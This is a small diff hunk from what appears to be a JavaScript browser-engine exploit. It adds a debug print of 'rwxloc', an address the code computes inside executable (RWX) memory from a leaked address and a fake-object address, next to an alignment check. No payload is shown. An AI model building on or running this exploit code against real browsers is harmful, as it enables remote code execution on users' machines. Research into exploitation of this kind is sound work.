@@ -131,6 +131,7 @@ var rwxloc=(f2i(leak_addr(3,mI)[0])>>32n)+0x68n;
 var loc=fake_obj_addr+0x18n;
 sub=0n;
 console.log(loc.toString(16));
+console.log(rwxloc.toString(16));
 if ((rwxloc - loc) % 8n != 0n)
 {
 	console.log((rwxloc-loc)%8n);
